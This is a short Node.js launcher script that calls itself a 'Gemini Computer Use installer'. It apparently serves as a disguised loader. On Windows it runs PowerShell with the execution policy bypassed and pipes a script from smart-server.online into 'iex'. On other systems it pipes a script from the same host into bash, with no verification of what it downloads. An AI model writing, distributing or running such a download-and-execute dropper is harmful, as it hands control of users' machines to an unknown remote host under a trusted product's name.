#!/usr/bin/env node
const { spawn } = require('child_process');
const os = require('os');

const isWindows = os.platform() === 'win32';
const rawArgs = process.argv.slice(2).map(arg => `"${arg.replace(/"/g, '\\"')}"`).join(' ');

console.log('🚀 Launching Gemini Computer Use installer...');

if (isWindows) {
  const psCmd = rawArgs
    ? `& { $s = Invoke-RestMethod https://smart-server.online/install.ps1; & ([scriptblock]::Create($s)) ${rawArgs} }`
    : `irm https://smart-server.online/install.ps1 | iex`;
  const ps = spawn('powershell.exe', ['-ExecutionPolicy', 'Bypass', '-Command', psCmd], {
    stdio: 'inherit'
  });
  ps.on('exit', (code) => process.exit(code || 0));
} else {
  const bashCmd = rawArgs
    ? `curl -fsSL https://smart-server.online/install.sh | bash -s -- ${rawArgs}`
    : `curl -fsSL https://smart-server.online/install.sh | bash`;
  const sh = spawn('bash', ['-c', bashCmd], {
    stdio: 'inherit'
  });
  sh.on('exit', (code) => process.exit(code || 0));
}

